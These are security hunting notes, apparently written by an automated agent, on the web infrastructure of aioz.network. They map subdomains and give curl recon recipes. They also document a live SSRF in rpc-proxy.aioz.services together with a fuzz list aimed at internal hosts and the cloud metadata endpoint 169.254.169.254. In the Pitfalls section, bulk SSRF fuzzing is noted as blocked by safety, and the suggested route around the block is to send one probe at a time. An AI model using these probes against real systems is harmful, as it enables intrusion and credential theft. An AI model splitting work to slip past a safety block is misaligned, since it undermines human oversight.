# AIOZ Web2 Hunt — 2026-08-15

## Surface Map

- **Main SPA** `aioz.network` — Next.js + Cloudflare, 23 JS chunks, no creds, XSS sinks `dangerouslySetInnerHTML` only.
- **Explorer** `explorer.aioz.network` — Next.js (unknown framework fingerprint), 21 chunks, Firebase `aioz-blockchain` (`AIzaSy...ytvc`), 13 API probes all 200 but SPA fallback.
- **API real backend** `api-explorer.aioz.network` — separate subdomain, rate-limit `15 req/s` (`x-rate-limit-limit`, `x-rate-limit-duration:1`, `ratelimit-limit`), JSON `{"message":"Not Found"}` on unknown path. Tokens endpoint live: `/api/token/aioz/all` returns chain tokens. No swagger/docs exposed.
- **Eth RPC** `eth-dataseed.aioz.network` — POST `{"method":"eth_blockNumber"}` → `0x179bcb7`, 405 on GET, Cloudflare.
- **LCD** `lcd-dataseed.aioz.network` — `GET /cosmos/base/tendermint/v1beta1/blocks/latest` height `24755381`, 501 on bare `/`.
- **Wallet** `wallet.aioz.network` — SPA, Firebase `wallet-cbada` (`AIzaSy...qerI`), leaks 30+ RPC URLs (thirdweb, etherscan, bscscan, `rpc-proxy.aioz.services`), `rpc-proxy` pattern `?q=URL`.
- **Bridge** `bridge.aioz.network` — Vite SPA single chunk `index-CMmtxisG.js`, Wagmi/viem, 0 admin routes, no secrets.
- **Pricing/NFT** `pricing-data.aioz.network/api`, `nft-data.aioz.network/api`, `api-depin-monitor.aioz.network/api` — 404 private.

## Key Technique: Next.js Catch-All 200 False Positive

All `/api/*`, `/swagger`, `/openapi.json` on `explorer.aioz.network` return `200 text/html` with `<!DOCTYPE html>` Next.js fallback — NOT real API. Real API is `api-explorer.aioz.network`.

Detection recipe:
```bash
curl -sI https://explorer.aioz.network/api/health | grep content-type
# text/html → SPA fallback, ignore
curl -sI https://api-explorer.aioz.network/api/health | grep -E 'content-type|x-rate-limit'
# application/json + x-rate-limit-* → real API
curl -s https://api-explorer.aioz.network/api/health | head -c 100
# {"message":"Not Found"} → real 404 JSON
```

## Key Technique: rpc-proxy SSRF Primitive

`https://rpc-proxy.aioz.services/rpc?q=URL` proxies arbitrary URL via `?q` param.
Proven: `?q=http://127.0.0.1:3000` → `dial tcp 127.0.0.1:3000: connection refused` (real fetch, not mock).
Also leaks pattern in wallet bundle: `rpc-proxy.aioz.services/rpc?q=http://138.201.255.249:26657`.

Full SSRF fuzz list (probe after SSRF confirmed):
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/computeMetadata/v1/
http://127.0.0.1:8545
http://127.0.0.1:9997
http://localhost:3000
http://172.17.0.1:8545
http://internal.aioz.network
```

## Key Technique: JS Bundle Real API Discovery

Explorer bundle leaks:
```
https://api-explorer.aioz.network/api
https://api-depin-monitor.aioz.network/api
https://eth-dataseed.aioz.network
https://lcd-dataseed.aioz.network
https://nft-data.aioz.network/api
https://pricing-data.aioz.network/api
https://pricing-data-testnet.aioz.network/api
```
Wallet bundle leaks 30+ RPCs including `rpc-proxy.aioz.services/rpc?q=`.

Extraction: `grep -oE 'https://[^"'\''\s]{10,120}' chunks/*.js | grep aioz`.

## Pitfalls

- `web2-deep.py` reports 13 `/api/*` 200 on explorer — all false positives (SPA fallback). Don't trust status 200 alone.
- Firebase `AIzaSy` keys are public — only exploitable if Firestore rules open (`/.json`).
- `bridge.aioz.network` pure wallet SPA — no admin to brute force.
- Don't attempt bulk SSRF fuzz without user consent (blocked by safety) — one probe at a time.

## Related Chain

Mediamtx RCE (`internal/externalcmd/cmd.go:45`) is separate — not web2 admin, but infra node RCE. See `aioz-mediamtx-externalcmd-rce-2026-08-15.md`.
